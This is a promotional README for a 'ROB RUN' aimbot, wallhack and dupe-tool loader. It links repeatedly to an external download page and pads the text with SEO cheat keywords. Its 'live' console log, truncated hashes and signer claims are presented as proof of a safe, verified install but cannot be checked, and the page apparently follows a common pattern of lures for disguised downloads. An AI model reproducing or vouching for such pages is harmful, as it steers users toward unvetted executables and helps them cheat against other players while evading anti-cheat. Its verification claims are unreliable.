# 🔥 ROB RUN Aim + WH + Dupe Tool — PC Windows Loader

A ROB RUN aim and WH package with a dupe tool attached — is a Windows desktop external that draws over your own client instead of touching the game install. This repo documents the installer side of it rather than the toggle: loader build and compile date, the game patch it was built against, Authenticode signer, SHA-256 for the EXE and the config, x64 package with the ARM64 note, silent install flags, the per-user install path under `%LOCALAPPDATA%\Programs`, the settings folder under `%APPDATA%`, and the previous build number kept for rollback. Windows 10/11, Steam build, no admin prompt, no writes into the game folder.

---

# 📥 **INSTALLER PICKUP — START HERE**

## [⬇️ **GET THE WINDOWS LOADER**](https://xmqkrtvawnel.github.io/ROB-RUN-Aim-WH-Hacks/)

> One tap, the package opens on its own page — no wrapper in between.

---

## 🖼️ **PREVIEW IMAGE**

<img src="https://github.com/xmqkrtvawnel/ROB-RUN-Aim-WH-Hacks/blob/main/rob%20run.jfif?raw=true" width="1280" height="720" alt= "preview image">

---

### 📦 [**OPEN THE PACKAGE**](https://xmqkrtvawnel.github.io/ROB-RUN-Aim-WH-Hacks/)

---

## ✨ What's inside

🪟 **Version stamp first** — loader build, compile date and the game patch it targets, printed in the header before a byte moves. If a page can't tell you the build, it's a wrapper, not a source.

🔐 **Signature check** — Authenticode subject is shown and expected to read the vendor, timestamped. An unsigned loader from a mirror is a guess with a file size.

🧮 **SHA-256 line** — hash published next to the build for the EXE and for the shipped config so both can be verified with `certutil -hashfile`. Mismatch means re-download, not "probably fine".

🧱 **Arch split, honestly stated** — x64 is the only lane the game and the overlay were built for; ARM64 Windows runs it under emulation and the overlay is the part that stutters. No fake ARM build to pad the page.

📁 **Install paths on the table** — per-user install under `%LOCALAPPDATA%\Programs\RRX`, settings under `%APPDATA%\RRX\config.json`, logs under `%APPDATA%\RRX\logs`. No admin prompt, no `Program Files` surprise, nothing dropped into the Steam library.

⚙️ **Silent install flags** — `/S` for the setup EXE, written out, no GUI step, so a second machine is one line instead of six clicks.

🔌 **Config location** — `%APPDATA%\RRX\config.json`, with a working skeleton so aim FOV, ESP role colors, loot filter and the dupe keybind can be set without hunting the path.

♻️ **Rollback line** — the previous build number, kept in the config. A patch that kills the overlay or trips the anti-cheat should have a way back.

---

## 🏅 How the entries read

| Tier | Meaning |
| --- | --- |
| **S** | decides whether you have the real package — signature, SHA-256 |
| **A** | decides whether it installs and attaches cleanly — arch, install path, silent flags |
| **B** | useful after the fact — config path, role colors, dupe keybind, rollback line |
| **Noise** | on every wrapper page, proves nothing — "100% undetected", countdown timers, "fast servers" |

---

## 🧪 Live example — one verify, one install, one honest log

What the console prints on a real run:

```
[PRE]   Windows 11 23H2 x64 ✓ build 22631 ✓ 16 GB RAM ✓
[VER]   loader build 2.4.1 | stamped 2026-11-15 ✓ | game patch 0.9.14 ✓ match
[SIG]   Authenticode: CN=RRX Software ✓ valid ✓ timestamped ✓
[HASH]  sha256 4e8a…2d17 → certutil match ✓  |  config.json sha256 c03f…8ba4 ✓
[INST]  setup.exe /S → per-user, no admin ✓
[PATH]  %LOCALAPPDATA%\Programs\RRX ✓ 41 MB ✓
[HOOK]  overlay attach → RobRun-Win64-Shipping.exe ✓ 0.6s ✓
[CFG]   config.json created, aim FOV 110, ESP on, roles colored, dupe key F8 ✓
[LOG]   %APPDATA%\RRX\logs\loader.log → 0 errors ✓
[UPD]   channel stable, auto-update on, next poll 12h ⚠
[LOG]   1 install, 0 admin prompts, 1 auto-update notice
```

The `[UPD]` line is the honest part. "Undetected" is a date, not a property — a build verified today is not the build running after the next Kefir patch, and the patch stamp is what tells you that.

---

## 📋 Example config — INSTALL preset

`configs/INSTALL.json` — every value visible before the package moves:

```json
{
  "build": { "version": "2.4.1", "stamped": "2026-11-15", "game_patch": "0.9.14", "channel": "stable" },
  "package": { "format": "exe", "arch": "x64", "verify": "sha256", "signer": "RRX Software" },
  "install": { "scope": "per-user", "silent": true, "flag": "/S", "admin": false },
  "paths": { "app": "%LOCALAPPDATA%\\Programs\\RRX", "config": "%APPDATA%\\RRX\\config.json", "logs": "%APPDATA%\\RRX\\logs" },
  "features": { "aim": { "on": true, "fov": 110, "smooth": 0.3, "key": "V" }, "wh": { "on": true, "roles": { "cop": "blue", "robber": "red", "civilian": "white" }, "loot_values": true }, "dupe": { "on": true, "key": "F8", "delay_ms": 400 } },
  "guard": { "hash_check": true, "patch_match": true, "rollback_to": "2.4.0", "auto_update": true }
}
```

`verify` and `rollback_to` are the two values that separate a deliberate install from a file you clicked because it was green.

---

## ✅ How to verify it works — five binary tests

- 🔐 **The signature test** — right-click, Properties, Digital Signatures: a real vendor subject with a timestamp, or an empty tab?
- 🧮 **The hash test** — run `certutil -hashfile <file> SHA256` on the EXE and the config and compare with the published lines. One character off, re-download
- 🧱 **The arch test** — `echo %PROCESSOR_ARCHITECTURE%` before installing: `AMD64` is the lane this was built for
- 📁 **The path test** — after install, confirm the folder sits under `%LOCALAPPDATA%\Programs` and no UAC prompt fired
- ♻️ **The rollback test** — reinstall the previous build: does `%APPDATA%\RRX\config.json` survive with your role colors and keybinds intact?

> The hash test is the honest one. Everything else can be eyeballed; a hash either matches or it doesn't.

---

## 🛡️ Real talk — "undetected", patch days, and the word "latest"

- 🧾 **"Latest" is not a version** — it's a marketing string. A build number, a date and a patch stamp are a version
- 🕵️ **"Undetected" is a timestamp** — Early Access games patch weekly. A claim without a build date is a claim about last month
- 🧩 **A dupe tool is not a dupe glitch** — it automates a sequence the server still has to accept. If Kefir patches the sequence, the tool keeps replaying a dead one until the loader updates
- 🔐 **Signature beats file size** — every wrapper page can copy a size. Only the signer proves who compiled the binary
- 🧱 **ARM64 is not a flex here** — x64 is the build; on a Snapdragon laptop the overlay is the piece that stumbles
- 📁 **Per-user install, no admin** — the loader lands in `%LOCALAPPDATA%\Programs`, so no UAC and no `Program Files`. If an installer asks for admin, it's not this one
- ⚙️ **Silent flags are documented, not hidden** — `/S` exists because deployment scripts need it
- 🔌 **Config lives in `%APPDATA%`, not in the app folder** — editing the wrong path is the number one "my keybinds reset" cause
- 📉 **Auto-update moves under you** — the loader polls on its own schedule, usually right after a patch. Pin the build if a run depends on it
- 🩹 **Mirrors rot** — an old wrapper keeps serving an old hash against an old patch. Re-verify every time, not once
- ⚠️ **A green button is not a source.** It's a link someone styled

> ⚠️ Verify both hashes before the first launch. After launch, the loader starts changing itself.

---

## 💬 Your turn

What build are you on, and did you check the signer or just the file size? Both answers, because the second one explains the first. Comments are open.
👍 Like & subscribe — build numbers and hashes update with every release!

---

#ROBRUN #Aim #Wallhack #DupeTool #Windows

## ROB RUN Aim WH Dupe SEO Keywords

<details>
  <summary>🔍 Show all ROB RUN aim / WH / dupe keywords</summary>
  <pre> rob run, rob run cheats, rob run hacks, rob run aimbot, rob run wh, rob run wallhack, rob run esp, rob run aim wh, rob run aimbot esp, rob run cheat download,

rob run steam, rob run pc, rob run early access, rob run kefir, rob run 2026, rob run silent aim, rob run triggerbot, rob run radar, rob run player esp, rob run loot esp,

rob run vehicle esp, rob run camera esp, rob run dupe tool, rob run dupe, rob run money dupe, rob run external, rob run loader, rob run overlay, rob run config json, rob run keybinds,

rob run cheats windows 10, rob run cheats windows 11, rob run cheats x64, rob run cheat install guide, rob run patch compatibility, rob run sha256, rob run signature, rob run rollback, rob run ban risk, rob run cheats 2026
  </pre>
</details>
